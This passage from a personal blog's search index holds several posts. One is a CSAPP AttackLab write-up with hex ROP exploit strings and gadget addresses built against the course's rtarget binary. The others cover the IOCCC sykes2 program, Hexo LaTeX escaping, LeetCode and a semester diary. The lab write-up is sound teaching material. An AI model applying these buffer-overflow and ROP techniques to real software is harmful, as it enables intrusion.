too long than I have expected. There certianly will be various different unexpected problems when you try it yourself but believe that all those technical problem can be tackled down. There is simply just no magic. Best wishes to all of you in this last line.]]></content>
      <categories>
        <category>Networking</category>
      </categories>
      <tags>
        <tag>Openvpn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSAPP - AttackLab Writeup]]></title>
    <url>%2F2019%2F08%2F17%2FAttackLabwriteup%2F</url>
    <content type="text"><![CDATA[ROPlevel 2Requirement : You can construct your solution using gadgets consisting of the following instruction types, and using only the ﬁrst eight x86-64 registers (%rax–%rdi). According my original Phase 2 answer: 1234567830 31 32 33 34 35 36 37 38 39 /* 34 characters padding */30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 bf fa 97 b9 59 /* mov $0x59b997fa,%edi */c3 /* retq */9a dc 61 55 00 00 00 00 /* return addr shellcode: 0x5561dca0 &lt;- return ip (now) */ec 17 40 00 00 00 00 00 0a /* return addr touch2 */ I should rewrite the mov $0x59b997fa,%edi instruction using the gadgets given. I thought of laying the value 0x59b997fa on the stack and using pop %rdi instruction, which is encoded 5f. And I found one: 401419: 69 c0 **5f c3** 00 00 imul $0xc35f,%eax,%eax. This instruction starts at address 0x401419, which is the code section and will not change on each run. So the gadget sharts at 0x40141b. Then I can easily write the following code. 123456730 31 32 33 34 35 36 37 38 39 /* 40 characters padding */30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 bf fa 97 b9 59 c3 1b 14 40 00 00 00 00 00 /* return rop: 0x40141b */fa 97 b9 59 00 00 00 00 /* the cookie value to be poped */ec 17 40 00 00 00 00 00 0a /* return addr touch2 */ Results: 123456789ainevsia@linux:~/target1$ ./rtarget -q -i exploit-raw.rl2Cookie: 0x59b997faTouch2!: You called touch2(0x59b997fa)Valid solution for level 2 with target rtargetPASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:rtarget:2:30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 BF FA 97 B9 59 C3 1B 14 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 EC 17 40 00 00 00 00 00 level 3I think I should first make up the value 35 39 62 39 39 37 66 61 on the stack and I also need a pointer to it. How can i place the pointer on to the stack? Maybe movq %rsp, %rdi encoded 48 89 e7, let’s find: 123454019a0: 8d 87 48 89 c7 c3 movq %rax, %rdi401a03: 8d 87 41 48 89 e0 c3 movq %rsp, %rax4017b9: 48 83 c4 28 add $0x28,%rsp4017bd: c3 retq 4019d8: add al, 0x37 ; ret OK, now i can already get the pointer to the stack. Next the challenge is how to make up the value 35 39 62 39 39 37 66 61, whcih is 0x6166373939623935 in hex. Well it’s easy, just place it in our string. Chances are that it can be pwned since the stack changes every run. expliot12345678910111230 31 32 33 34 35 36 37 38 39 /* 40 padding */30 31 32 33 34 35 36 37 38 3930 31 32 33 34 35 36 37 38 3930 31 32 33 34 35 36 37 38 3906 1a 40 00 00 00 00 00 /* return addr 401a06: movq %rsp, %rax */d8 19 40 00 00 00 00 00 /* return addr 4019d8: add $0x37, %al &lt;- here is rsp */a2 19 40 00 00 00 00 00 /* return addr 4019a2: movq %rax, %rdi */fa 18 40 00 00 00 00 00 /* return addr touch3: 0x4018fa */90 35 39 62 39 39 37 66 61 35 /* padding 55 - 8 * 3 = 31 */90 35 39 62 39 39 37 66 61 3590 35 39 62 39 39 37 66 61 3590 35 39 62 39 39 37 66 61 00 /* string */ Result1234567Touch3!: You called touch3(&quot;59b997fa&quot;)Valid solution for level 3 with target rtargetPASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:rtarget:3:30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 06 1A 40 00 00 00 00 00 D8 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 90 35 39 62 39 39 37 66 61 35 90 35 39 62 39 39 37 66 61 35 90 35 39 62 39 39 37 66 61 35 90 35 39 62 39 39 37 66 61 00]]></content>
      <categories>
        <category>CSAPP pwn</category>
      </categories>
      <tags>
        <tag>SJTU</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Github Security Alert : Loadsh]]></title>
    <url>%2F2019%2F07%2F27%2Flodash%2F</url>
    <content type="text"><![CDATA[十天前就收到这个alert了，当时没时间弄，也不会弄。 中间折腾了很多，后来发现是我hexo的next主题用了一个我自己从git上clone下来的three插件，用的是yarn管理js包，进去pull一下alert就解除。]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>npm yarn hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2006混淆C语言大赛-sykes2源码解析]]></title>
    <url>%2F2019%2F04%2F19%2Fsykes2%2F</url>
    <content type="text"><![CDATA[上周六在准备华为网络技术考试的闲暇之余发现了一段超级有趣的代码，出自国际C语言混乱代码大赛。或许你像我一样第一次听说这个比赛，那就摘一段维基百科的介绍： 国际C语言混乱代码大赛（IOCCC, The International Obfuscated C Code Contest）是一项国际程序设计赛事。从1984年开始，本赛事每年举办一次。本赛事的目的是写出最有创意和最让人难以理解的C语言代码。 先看一眼这段小巧玲珑的代码1main(_)&#123;_^448&amp;&amp;main(-~_);putchar(--_%64?32|-~7[__TIME__-_/8%8]["&gt;'txiZ^(~z?"-48]&gt;&gt;";;;====~$::199"[_*2&amp;8|_/64]/(_&amp;2?1:8)%8&amp;1:10);&#125; 运行这段代码看看干了啥123456789$ gcc ioccc.c -o a.out$ ./a.out !! !! !! !!!!!! !!!!!! !!!! !! !! !! !! !! !! !! !! !! !! !! !! !! !! !! !! !! !!!!!! !! !! !! !! !! !!!! !!!! !! !! !! !! !! !! !! !! !! !! !! !! !! !! !! !! !! !! !! !!!!!! !!!!!! !!!!!! 这段代码居然能够将编译时刻系统时间（非运行程序时间）按照ASCII风格输出，太强了。 说实话，第一次看到这种操作的我感觉已经被秀了一脸了；等我仔细研究完这行代码之后的感觉是：太骚了，代码居然还能这么写！ 接下来准备详细分析这一行小小的代码是如何实现如此炫酷复杂吊炸天的功能的。 全文极度烧脑预警 一些你可能从来没有考虑过的问题何时可以不指明返回类型？正常的main函数声明都是这样的 12345int main(int argc, char * arcgc[])&#123; return 0;&#125; 当然main函数的参数是可以省略的，可以单单写成main()。return 0也是可以省略的，程序会正常终止，只不过会多一条warning。 在实际生产环境中当然不会出现这样的代码，这只是极客们利用c语言的细节追求极简的成果。 甚至，main前面的int声明都可以省略。 Stack Overflow上有讨论这个默认类型声明： 在K&amp;R的经典教材C Programming Language的§6.5.2.1中列举了一些隐含的类型声明：int, signed, signed int 或是没有声明类型这四者是等价的。 所以main前面的int可以省略，参数列表里的int也可以省略，最后就会只剩下代码中的： 1main(_)&#123;&#125; 注意到_是一个变量名，处在原本argc的位置，经过试验发现，其功能就是记录传入的参数个数。当你想我一样使用$ ./a.out不加任何参数调用的时候，其值就是1。 argc is 1; argv[0] is the string “./a.out” argv[1] is a NULL pointer 何时可以不包含头文件？putchar()函数可以不用include头文件。虽然它不是系统函数，但是实测确实可以。 这样我们可以愉快地把这段代码的格式排排好，把省略的声明补齐，顺便加上头函数。 预处理：变得能看1234567#include &lt;stdio.h&gt;int main(int i)&#123; i^448&amp;&amp;main(-~i); putchar(--i%64?32|-~7[__TIME__-i/8%8]["&gt;'txiZ^(~z?"-48]&gt;&gt;";;;====~$::199"[i*2&amp;8|i/64]/(i&amp;2?1:8)%8&amp;1:10); return 0;&#125; 利用&amp;&amp;的短路求值特性将第一行展开，^亦或运算符仅在i==448时为假，-~i将i取反之后取负数。由于int是使用补码在计算机内部存储的，取负数操作实际上等效于按位取反后加1，-~i等效于i+1。所以可以发现第一行就是一个条件递归。 123456int main(int i)&#123; if (i != 448) main(i+1); i--; putchar(i%64?32|-~7[__TIME__-i/8%8]["&gt;'txiZ^(~z?"-48]&gt;&gt;";;;====~$::199"[i*2&amp;8|i/64]/(i&amp;2?1:8)%8&amp;1:10); return 0;&#125; 此时需要知道我们在第一次进入main函数的时候i的初始值是1（不加参数的话）。此时需要把之后会对i有操作的–i提取到putchar外面（不然没法转化），这句递归可以转化为循环（非常不直观，需要花点时间好好想想）。 12345int main()&#123; for (int i=447; i&gt;=0; i--) &#123; //由于外层i--的操作，这里从447到0 putchar(i%64?32|-~7[__TIME__-i/8%8]["&gt;'txiZ^(~z?"-48]&gt;&gt;";;;====~$::199"[i*2&amp;8|i/64]/(i&amp;2?1:8)%8&amp;1:10); &#125;&#125; 要注意i是从447减小到0的，一共执行448次。因为递归调用的时候是从main(1)一直到main(448)。i=448时不再继续递归，但该次main剩下的操作还是要进行。 接下来只有一句putchar了，看来一共会输出448个字符。最后的:10可以知道根据条件输出会有回车LF(ASCII:10)，数一数最开始输出的图形的行数，我们发现有7行，可以猜测一下这个输出回车的条件应该会是与7的倍数有关。但是中间这一行putchar实在太长，我们一点一点看。首先看一看第一个?:运算符的条件 1putchar(i%64?/*some value*/:10); 这时我们突然发现每行的字符448/7=64。于是我们知道了每64个字符会出现一个换行符。 把:?运算符写成if-else形式会更加直观1234567891011int main()&#123; int i; for (i = 447; i &gt;= 0; i--) &#123; if (i % 64 == 0) putchar('\n'); else &#123; putchar(32 | -~7[__TIME__ - i / 8 % 8]["&gt;'txiZ^(~z?" - 48] &gt;&gt; ";;;====~$::199"[i * 2 &amp; 8 | i / 64] / (i &amp; 2 ? 1 : 8) % 8 &amp; 1) &#125; &#125; return 0;&#125; 你看的精疲力尽了吗？哈哈我也写的累了。但是正真巧妙的东西还没有开始呢！ 我们需要花非常大的力气去看看putchar里到底写了什么。 预处理：变得像人写的来看这个输出，发现里面有两个字符串常量，还有移位运算和许多的位运算。这时候我不得不默默地掏出了好久没看的运算符优先级顺序表，给优先级加上括号。一句话就是算数运算优先，然后是移位运算，然后逻辑比较运算，最后位运算。 132|-~7[__TIME__-(i/8%8)]["&gt;'txiZ^(~z?"-48] &gt;&gt; ";;;====~$::199"[(i*2)&amp;8|i/64]/(((i&amp;2)?1:8)%8)&amp;1 所以说上面这一行表达式的运算顺序是32|/*some value*/是最后算的，右边是(一个含有__TIME__宏的大东西 &gt;&gt; 一个字符串一样的东西) &amp;1，这里可以先定义两个本地变量来使最后的结果显得更加清楚。 123456789101112int main()&#123; int i; for (i = 447; i &gt;= 0; i--) &#123; if (i % 64 == 0) putchar('\n'); else &#123; char a = -~7[__TIME__-(i/8%8)]["&gt;'txiZ^(~z?"-48]; char b = ";;;====~$::199"[((i*2)&amp;8)|(i/64)]/((i&amp;2)?1:8)%8; putchar(32 | ((a &gt;&gt; b) &amp; 1)); &#125; &#125; return 0;&#125; 然后来处理这一堆方括号，这其中可能又会触及到大家对c语法的一些盲区了。大家都知道a[1]这个表达式是取了数组a中的第二个元素，但是其实还有一种等价的写法是1[a]，大多数人应该基本不会碰到这样的表达式，实在是太……无聊的写法，但是这也向我们揭示了一个关于[]运算符的一个本质，就是a[1] =&gt; *(a + 1)，大家永远不应该忘记[]的实质是在一个指针上偏移一个量再去取出其中的数据。利用这一个知识点，把形如1[a]的表达式中方括号之前的东西的位置换到后面去并加上方括号，我们继续把上面的a和b展开。 前文已经提到过：-~i等效于i+1123456789101112int main()&#123; int i; for (i = 447; i &gt;= 0; i--) &#123; if (i % 64 == 0) putchar('\n'); else &#123; char a = ("&gt;'txiZ^(~z?"-48)[(__TIME__-(i/8%8))[7]] + 1; char b = ";;;====~$::199"[((i*2)&amp;8)|(i/64)]/((i&amp;2)?1:8)%8; putchar(32 | ((a &gt;&gt; b) &amp; 1)); &#125; &#125; return 0;&#125; 再引入一个变量t以简化，并且把-48和-(i/8%8)这两个偏移量移动到后面的方括号内去,12char t = __TIME__[7 - i / 8 % 8];char a = "&gt;'txiZ^(~z?"[t - 48] + 1; 我们知道，在&gt;&gt;号右边的应该是一个数来表示位移量，于是我们再引入一个shift变量，并且根据优先级展开b变量，用c表示a&gt;&gt;b。注意到，(i&amp;2)?1:8里还有一个条件判断，把他展开成一个分支语句。 1234567891011121314151617int main()&#123; int i; for (i = 447; i &gt;= 0; i--) &#123; if (i % 64 == 0) putchar('\n'); else &#123; char t = __TIME__[7 - i / 8 % 8]; char a = "&gt;'txiZ^(~z?"[t - 48] + 1; char shift = ";;;====~$::199"[(i*2)&amp;8 | i/64]; if ((i&amp;2) == 0) shift /= 8; shift = shift % 8; char c = a &gt;&gt; shift; putchar(32 | c&amp;1); &#125; &#125; return 0;&#125; 写到这里我们先停一下，看上去已经比较像是正常的代码了（误），一些运算符的优先级我们也都已经展开完毕了，好像似乎无法进行简化了，但是程序的逻辑真的是一丝都没有任何的明朗。我们需要从头开始看看整体逻辑。for循环一共执行448次，每64次会换行，这样就会输出7行。不换行的时候会进行一堆判断，最后输出的关键语句是putchar(32 | c&amp;1)，稍微看一下这个逻辑就会发现，32 | c&amp;1只有两个值，要么是32(ASCII 空格)或是33(ASCII !)。这样会给我们真正地深入分析提供思路。 处理：理清逻辑1234567!! !!!!!! !!!!!! !!!!!! !! !!!!!!!! !! !! !! !! !! !! !! !!!! !! !! !! !! !! !! !! !!!! !! !! !! !! !!!! !! !!!!!! !!!!!!!! !! !! !! !! !! !!!! !! !! !! !! !! !!!! !! !!!!!! !!!! !! !!!!!! 再次整理一下我们已经了解的一些信息： 最终输出一共有7行，每行64个字符。不知大家是否对64和代码中出现了很多次的8这两个数字有些许感觉，其实在这里结合我们观察到的图形，我们已经可以大胆地假设：$64=8\times 8$。有人会想这还要你假设，这不是事实吗？我的意思是一行的64个字符可以被均分为8组，每组8个字符。写到这里你再看看上图就知道：冒号其实和数字是同等的地位，这是后话了。这样的话我们就可以把这个$7\times 64$矩形分割成为八个$7\times 8$的小矩形，分别对应小时的两位数字、冒号、分钟的两位数字、冒号秒的两位数字。 这样的话我们就有足够的insight可以着眼于shift这个变量了。 shift 移位变量初探1234char shift = ";;;====~$::199"[ (i*2)&amp;8 | i/64];if ((i&amp;2) == 0) shift /= 8;shift = shift % 8; i/64这是两个整型做除法，所以得到向下取整的整数。不难想象这可以表示行号，在0到6之间，用3个bit就可以表示。 (i*2)&amp;8涉及到了位运算。(i*2)等价于i左移1位，(i*2)&amp;8等价于检测原本i的倒数第3位的情况，只要i = 4, 5, 6, 7 mod 8，这位就是1。 (i*2)&amp;8 | i/64前半部分的结果除了倒数第4位有可能有值，其他位全为0；后半部分只有3个bit，与在一起正好是一个4bit的数。相当于x000|0yyy--&gt;xyyy。 当i = 0, 1, 4, 5 mod 8时，i&amp;2为0，进入if分支，shift将会左移三位。 最后如论如何，shift mod 8后被映射到了0-7上，那么shift就是一个0-7的数。 string1 居然是……到了这个时候你可能会想了，这个shift居然是一个和行号有关的量，我们完全有理由相信shift就是一个用来表示位置的量。这时候我们再回过神来看前面的那个含宏的变量a。在这之前，补充一个必须的知识点，就是__TIME__这个宏是长啥样的。__TIME__会返回一个字符串，用printf(&quot;%s&quot;, __TIME__)会得如下的结果：19:22:18，形如&quot;HH:MM:SS&quot;。 12char t = __TIME__[7 - i / 8 % 8];char a = "&gt;'txiZ^(~z?"[t - 48] + 1; 又是出现了好多的8啊！但是这回你应该可以自己分析出来了，i / 8 % 8得到的是当前位置我应该打印的是什么字符（$7\times 8$的小矩形），用7减是因为i是从448开始减小的，这样随着i的减小，7 - i / 8 % 8可以按照从0到7的顺序反复遍历了。注意到十进制的48在ascii码表中对应的是数字0哦。那样的话，&quot;&gt;&#39;txiZ^(~z?&quot;[t - 48]就相当于根据这一位该显示的数字在字符串&quot;&gt;&#39;txiZ^(~z?&quot;中做选择。 看到这一步，我们该是不知道这个字符串是干嘛用的，但是大家不用慌，我们已经知道t - 48只能在0-9和10（冒号）中取值，我这就给大家来个枚举法，看看到底是什么。 顺便一提，为什么一定要写成&quot;&gt;&#39;txiZ^(~z?&quot;[t - 48] + 1这种+1的形式而不直接写&quot;另一个字符串&quot;[t-48]呢？这是因为~再加1就不是可打印字符了哦，真是挺凑巧的。 0-&gt;10在字符串中做选择后的值的二进制表示如下：12345678910110 001111111 001010002 011101013 011110014 011010105 010110116 010111117 001010018 011111119 01111011: 01000000 请大家在往下翻之前好好的看几眼这个表，看看每个二进制的第一位，特别是8这个数字所对应的二进制，再看看别的二进制。你想到了什么？ …… 现在就是拿出你数字电路水平的时候了。其实这tm就是个7段数码管！你可能会想，这我怎么看的出来啊！没事，回过头来看shift你就完全能感受到了。 shift 移位变量深入1234char shift = ";;;====~$::199"[ (i*2)&amp;8 | i/64];if ((i&amp;2) == 0) shift /= 8;shift = shift % 8; 这个if条件的除8后模8是不是有点眼熟啊，__TIME__[7 - i / 8 % 8]中就已经出现过了，不过这里的意思是 当i = 0, 1, 4, 5 mod 8时，i&amp;2为0，进入if分支，shift将会右移三位后取剩下的最低三位。 当i = 2, 3, 6, 7 mod 8时，shift直接取剩下的最低三位。 i/64表示行号，(i*2)&amp;8表示在小剧情的左半边还是右半边。 话不多说，打表！123456700005577117755771177557711665577227733772277337744443377 让我们对着表来理解&quot;;;;====~$::199&quot;[ (i*2)&amp;8 | i/64]，方括号内右边表示我（i）在第几行，左边表示我在这一行的左边还是右边。再次注意到这里的i是7-实际的行号（i是从448开始减小的，而putchar是从左上方到右下方的）。 在左半边：(i*2)&amp;8==1时就在”$::199”中选择（注意字符串结尾还有一个结束标志\0,行号从0到6，所以有7个选择）。 如果在右半边：(i*2)&amp;8==0时就在”;;;====~”中做选择。这样就和前面一样有7个选择了。其实我们马上可以意识到最后的~字符完全是用来凑数的，可以换成任何的可打印字符，因为永远用不到（只有7行0-&gt;6，数不到7）。 7段数码管原理再简化一点，$7\times 64$矩形被分割成为八个$7\times 8$的小矩形，每个小矩形按照模8的等价关系再被分为每一行和每一行的左半边和右半边。由于行号是从6减小到0，所以说选择的时候是从”$::199”和”;;;====~”中逆着选的。”$::199”对应行竖着下来”0111224”，”;;;====”对应着行竖着下来”5555333”，为什么左右半边又被分了呢？因为还有if条件的移位啊： 当i = 0, 1, 4, 5 mod 8时，shift将会右移三位后取剩下的最低三位。 当i = 2, 3, 6, 7 mod 8时，shift直接取剩下的最低三位。 也就是说，当在图中红框内时，属于i = 2, 3, 6, 7 mod 8时（再次提醒i是减小的），直接取低3位；别的位置时，取高三位。 这就很有意思了，看到有一列全是7，是在右边的情况，高位为111，可以验证;:的高三位全1 给大家贴一张ASCII码表 写到这里，大家都明白是怎么一会事了吧。再一次重新看完整的代码。 1234567891011121314151617int main()&#123; int i; for (i = 447; i &gt;= 0; i--) &#123; if (i % 64 == 0) putchar('\n'); else &#123; char t = __TIME__[7 - i / 8 % 8]; char a = "&gt;'txiZ^(~z?"[t - 48] + 1; char shift = ";;;====~$::199"[(i*2)&amp;8 | i/64]; if ((i&amp;2) == 0) shift /= 8; shift = shift % 8; char c = a &gt;&gt; shift; putchar(32 | c&amp;1); &#125; &#125; return 0;&#125; 使用单维度i来标志当前打印字符的位置，8位字符a表示这一个区域内：$7\times 8$的小矩形内该显示的数字的七段数码管各管脚的高低电平。shift移位后用来确定当前bit是否应该被点亮。 大家有部分没有看懂的话没关系的，只需要知道原理就是7段数码管的原理，两个字符串只不过是构造这个7段数码管。 当然，这里面的思想更加深邃。 后记从详细地分析这一行代码的过程中我们得到了些什么呢？ 知道了一行代码到底能干什么事 知道了看别人写的代码时是什么感受 知道了c还有这么多我不知道的特性 知道了一个道理：想的越多，写的越少 知道了条条大路通底层电子技术原理 对比1main(_)&#123;_^448&amp;&amp;main(-~_);putchar(--_%64?32|-~7[__TIME__-_/8%8]["&gt;'txiZ^(~z?"-48]&gt;&gt;";;;====~$::199"[_*2&amp;8|_/64]/(_&amp;2?1:8)%8&amp;1:10);&#125; vs12345678910111213141516171819202122int main()&#123; int i; for (i = 447; i &gt;= 0; i--) &#123; if (i % 64 == 0) putchar('\n'); else &#123; char line_num_inv = i / 64; char section_num_inv = i / 8 % 8; char section_num = 7 - section_num_inv; char t = __TIME__[section_num]; char a = "&gt;'txiZ^(~z?"[t - 48] + 1; char shift = ";;;====!$::199"[(i * 2) &amp; 8 | line_num_inv]; if ((i&amp;2) == 0) shift /= 8; shift = shift % 8; char c = a &gt;&gt; shift; putchar(32 | c&amp;1); &#125; &#125; return 0;&#125; do the same thing AcknowledgementStack Overflow - Obfuscated C Code Contest 2006. Please explain sykes2.c]]></content>
      <categories>
        <category>C</category>
      </categories>
      <tags>
        <tag>ioccc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用hexo-next+LaTeX输入公式时遇到的一些错误]]></title>
    <url>%2F2019%2F03%2F23%2FusingLaTeXinmd%2F</url>
    <content type="text"><![CDATA[起因去next配置里开了mathjax功能试了一下，遇到了些问题。 举个栗子当你按照LaTeX语法在md文件里输入如下公式时，在本地的Markdown preview里是没有任何错误的，但是部署上线后会是如下的效果 公式 1$J(\theta)=-\frac&#123;1&#125;&#123;m&#125; \sum_&#123;i=1&#125;^&#123;m&#125;\left[y^&#123;(i)&#125; \log \left(h_&#123;\theta&#125;\left(x^&#123;(i)&#125;\right)\right)+\left(1-y^&#123;(i)&#125;\right) \log \left(1-h_&#123;\theta&#125;\left(x^&#123;(i)&#125;\right)\right)\right]$ 效果 $J(\theta)=-\frac{1}{m} \sum{i=1}^{m}\left[y^{(i)} \log \left(h{\theta}\left(x^{(i)}\right)\right)+\left(1-y^{(i)}\right) \log \left(1-h_{\theta}\left(x^{(i)}\right)\right)\right]$ 注意在_之间的部分全部被解析成了Markdown语法中的斜体，其实原因就是hexo在静态生成网页时是先用Markdown的语法解析器解析你的md文件，然后再交给mathjax解析其中的公式。 解决在_前全部加上Markdown语法中的转义符\。 不过这样感觉就即不是纯正的Markdown，也不是是纯正的LaTeX了。 公式 1$J(\theta)=-\frac&#123;1&#125;&#123;m&#125; \sum\_&#123;i=1&#125;^&#123;m&#125;\left[y^&#123;(i)&#125; \log \left(h\_&#123;\theta&#125;\left(x^&#123;(i)&#125;\right)\right)+\left(1-y^&#123;(i)&#125;\right) \log \left(1-h\_&#123;\theta&#125;\left(x^&#123;(i)&#125;\right)\right)\right]$ 效果 $J(\theta)=-\frac{1}{m} \sum_{i=1}^{m}\left[y^{(i)} \log \left(h_{\theta}\left(x^{(i)}\right)\right)+\left(1-y^{(i)}\right) \log \left(1-h_{\theta}\left(x^{(i)}\right)\right)\right]$]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>LaTeX hexo-nex</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Anagram]]></title>
    <url>%2F2019%2F03%2F09%2Fanagram%2F</url>
    <content type="text"><![CDATA[一个很有意思的易位构词本来想在寝室四人的合影上刻上一句话 结果想到了易位构词 Three hero outwit few gamer. Together with me, we are four.]]></content>
      <categories>
        <category>Fun</category>
      </categories>
      <tags>
        <tag>SJTU</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2. Add Two Numbers]]></title>
    <url>%2F2019%2F03%2F01%2FLeetCode-2-AddTwoNumbers%2F</url>
    <content type="text"><![CDATA[读题的时候不认真看题写的时候就会完全按照自己想象中的题目去解题 这道题两个数字明明是已经逆向好给我做加法了 我还傻呵呵地先写了一遍 把两个链表逆向了一遍 另外 java也不太懂 reflections5+5的情况WA了一次 没有想到这样的情况 myCode1234567891011121314151617181920212223242526272829303132333435363738394041/** * Definition for singly-linked list. * public class ListNode &#123; * int val; * ListNode next; * ListNode(int x) &#123; val = x; &#125; * &#125; */class Solution &#123; public ListNode addTwoNumbers(ListNode l1, ListNode l2) &#123; int carry = 0; boolean conti = true; ListNode ret = new ListNode(0), al1 = l1, al2 = l2; ListNode r = ret; while (conti) &#123; int a1 = 0, a2 = 0; if (al1!=null) &#123; a1 = al1.val; al1 = al1.next; &#125; if (al2!=null) &#123; a2 = al2.val; al2 = al2.next; &#125; int sum = a1 + a2 + carry; if (sum&gt;=10) &#123; sum -= 10; carry = 1; &#125;else &#123; carry = 0; &#125; ret.val = sum; if (al1==null &amp;&amp; al2==null &amp;&amp; carry==0) conti = false; if (conti) &#123; ret.next = new ListNode(0); ret = ret.next; &#125; &#125; return r; &#125;&#125; Official12345678910111213141516171819public ListNode addTwoNumbers(ListNode l1, ListNode l2) &#123; ListNode dummyHead = new ListNode(0); ListNode p = l1, q = l2, curr = dummyHead; int carry = 0; while (p != null || q != null) &#123; int x = (p != null) ? p.val : 0; int y = (q != null) ? q.val : 0; int sum = carry + x + y; carry = sum / 10; curr.next = new ListNode(sum % 10); curr = curr.next; if (p != null) p = p.next; if (q != null) q = q.next; &#125; if (carry &gt; 0) &#123; curr.next = new ListNode(carry); &#125; return dummyHead.next;&#125; 真的是短小精悍啊！]]></content>
      <categories>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>linked-list math</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[寒假回顾+学期计划]]></title>
    <url>%2F2019%2F02%2F17%2Fsophomore-Winter%2F</url>
    <content type="text"><![CDATA[寒假见闻寒假从1月14日开始执行，由于在1月25日约了朋友一起参加美赛，所以14日到25日这两个礼拜就是常规培训、准备美赛。由于我和密院同年级的同学组队，中途跑了一个，只好带了一个大一小学妹凑满3个人，十足的菜鸡队配置。好像是第一次认认真真地参加大型团队竞赛，内心也没有什么底，抱着纯粹体验一把的心态稀里糊涂地就混到了25日。 我个人确实是极其不擅长与他人合作完成一个项目。开赛两小时我去图书馆借走了相关的书，我一度认为这些书能成为我们队的优势。但是，可能就是这些书限制了思路。书上用了CA，虽然到最后我们也没有能实现这个程序。当我和别人发生意见上的分歧时，我总是很难说服对方，我总是倾向于放弃我自己的想法，去听别人的指挥做事。我觉得自己除了第一天状态是在线的，剩下的4天智商全面下线，程序不想写，模型不知道怎么建，自暴自弃。 最后一天的通宵也是非常有意思。人生中第一次通宵，0点小憩了10分钟左右，之后完全没有很难受的感觉。整个教室挤满了人，没有回去睡觉的……虽然如此，如果是为了我个人的事情，我是绝对不会通宵的。 我也很想变的强一点，想一个更好的模型云云。美赛结束就已经29日了，再过一个礼拜就春节了。29日到除夕这个礼拜就完全是放飞自我的状态，每天打网游、补番、刷小说，干着自己每次放假都会干的事。把自己玩过的游戏一个个地玩过来，没有一个游戏能让我玩超过半天。我已经不再年轻了，曾经陪我一起打网游的人，现在也都各奔东西，再也找不到曾今的感觉了。而那些游戏，也随之失去了意义。嘛总之，花了不超过两周吧，把那些令人放纵的东西都玩腻了，把目光转向修养身心的东西上。 阅读文学类的从学期结束之前就已经在知米阅读上看原版的《时间机器》和《弗兰肯斯坦》，也不是会每天都读，会把情节攒起来一口气看。开学之后必须要养成每日打卡的习惯了，因为没什么时间能一口气看了。 非文学类的看了《万万没想到》、《csapp》、《算法》，这三本都是只看了10页的那种看，真正看的主要是老师要求的《漏洞分析》。 春节的时候，我轻哼：三个礼拜二十一天三百页十七章，按照我三天四章的速度，真的是绰绰有余。今天已经是寒假最后一天了，我正好看了一半。 有些时候吧，求其上者得其中，这种感觉真的实在是太强烈了。像我这种懒惰的人，在设定目标的时候就应该设置的高一点。压力对我来说并不是朋友，在高压下我只会惊慌失措，只有在心情平稳的时候我的效率才是最高的。所以说，大段的连续的时间是我必须要全神贯注地工作学习的时候。 有的时候我会问自己：我这是在干什么？当舍友告诉我他因为组会没法参加而决定退出的时候，我问自己：我是真的喜欢漏洞挖掘所以来到目前的这个实验室吗？我思考问题的时候一直是一种小农思想，即使进入大学这种想法也没法改正过来。过分地关注短期将会得到的利益，而不做长远的考虑。我害怕做出选择，选择之后又患得患失。我还需学习的知识实在是太多了，不知道我学什么能够学好。解决这种选择困难的方法就是安慰自己：我的生活并不会因为这一个选择就能变好，选了就选了，硬着头皮干下去，时间和努力不会亏待你的。 未来规划这个寒假和父母稍微聊了一下关于自己未来准备走的路线。我个人还是非常向往国外的教育的，但是父亲指出我根本不具备一个人在异国独立生活的基本能力。我想想也是，所以还是把目标定在了保研或是考研国内升学的方向。 上个学期给自己定下的每门课不低于85分的目标完美地完成了，更多的还是因为课程考试不难的原因，但是这学期出现了信号与系统和模电，我不敢再轻言不下85了。我渐渐意识到这种单纯以成绩来评价一学期是不科学的，因为这学期我还会有实验室的工作要做，难免会占去学习课内知识的时间。 我这学期的计划是信安的专业课我绝对是放在第一优先级的事情，然后再是电院的平台课，中间穿插实验室的研究吧。 写的非常的乱，但都是心底想说的话，暂且作为人生这一小段时光的总结吧。]]></content>
      <categories>
        <category>SJTU</category>
      </categories>
      <tags>
        <tag>保研 出国</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[KMP Algorithm]]></title>
    <url>%2F2018%2F11%2F30%2FKnuth-Morris-Pratt-Algorithm%2F</url>
    <content type="text"><![CDATA[Introduction &amp;&amp; Core thoughtsCalculate the maximum shifting digits based on the characterics of the given patten string. How to calculate?Suppose we have a pattern string p[0:n] and the comparation failure happened when comparing s[i+j] with p[j] (when comparing s[i:i+n] with p[0:n]), that indicates that s[i:j-1] are already known and are equal to p[0:j-1]. So that suggests us to take a great heap as much as possible provided that Notice that when the failure happens at p[j], the digits before are already clearify and can tell whether the naive comparsion will succeed or not. VisualizationI think these two pictures can clearly illustrate the phenomenon: AcknowledgementsA lot of thanks to KMP算法详解 which let me understand this algorithm.]]></content>
      <tags>
        <tag>Algorithm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[07-图5 Saving James Bond - Hard Version]]></title>
    <url>%2F2018%2F10%2F17%2FDS-07-%E5%9B%BE5%2F</url>
